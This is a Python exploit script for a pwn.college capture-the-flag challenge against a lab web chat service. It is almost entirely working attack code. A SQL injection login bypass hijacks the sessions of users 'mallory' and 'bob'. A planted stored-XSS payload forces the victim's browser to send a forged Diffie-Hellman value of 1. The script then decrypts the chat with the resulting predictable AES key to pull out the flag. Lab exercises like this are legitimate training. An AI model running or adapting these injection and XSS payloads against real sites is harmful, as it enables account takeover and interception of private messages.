#!/usr/bin/env python3
import requests, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

BASE = "http://10.0.0.1"

def sqli_session(user_prefix):
    r = requests.post(f"{BASE}/login",
                      data={"username": f"' OR username LIKE '{user_prefix}%'--",
                            "password": "x"},
                      allow_redirects=False)
    return r.cookies.get("session")

def post(sess, to_user, msg):
    return requests.post(f"{BASE}/chat/{to_user}",
                         cookies={"session": sess},
                         data={"message": msg}, timeout=5)

def get(sess, with_user):
    return requests.get(f"{BASE}/chat/{with_user}",
                        cookies={"session": sess}, timeout=5).text

def try_decrypt_hexlines(html, key_bytes):
    out = []
    for enc in re.findall(r'\b[0-9a-f]{32,}\b', html):
        if len(enc) % 32 != 0:
            continue
        try:
            pt = unpad(AES.new(key_bytes, AES.MODE_ECB)
                       .decrypt(bytes.fromhex(enc)), 16).decode()
            out.append(pt)
        except ValueError:
            continue
    return out

def main():
    mallory = sqli_session("mallory")
    bob = sqli_session("bob")
    if not mallory or not bob:
        print("[-] Failed to get sessions"); return
    print("[+] Sessions acquired")

    # Step 1: Plant looping-XSS to spam Alice's DH_A=1.
    xss = (
        '<script>(async()=>{try{'
        "setInterval(async()=>{await fetch('/chat/bob',{method:'POST',credentials:'include',"
        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'message='+encodeURIComponent(\"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: 1.\")});},200);"
        "}catch(e){}})();</script>"
    )
    post(mallory, "alice", xss)

    # Step 2: Trigger Alice's automation
    post(mallory, "alice", "I heard someone shared the flag with Bob!")

    # Step 3: Wait for Alice's forged dh_A
    print("[+] Waiting for Alice's forged dh_A...")
    for _ in range(30):
        if "DHE-AES: 1." in get(bob, "alice"):
            print("[+] Saw dh_A=1. from Alice!")
            break
        time.sleep(1)
    else:
        print("[-] Never saw forged dh_A"); return

    # Step 4: Start polling + spamming Bob's dh_B
    key = (1).to_bytes(256, "big")[:16]
    seen = set()
    print("[+] Waiting for flag message containing pwn.college{ ... }")
    for _ in range(300):  # up to ~5 minutes
        post(bob, "alice", "Hey Alice, sure: 1.")  # spam to stay first
        page = get(bob, "alice")
        pts = try_decrypt_hexlines(page, key)
        for m in pts:
            if m not in seen:
                seen.add(m)
                print("[dec]", m)
                if "pwn.college{" in m:
                    print("[FLAG]", m)
                    return
        time.sleep(1)
    print("[-] Flag not found after timeout.")

if __name__ == "__main__":
    main()
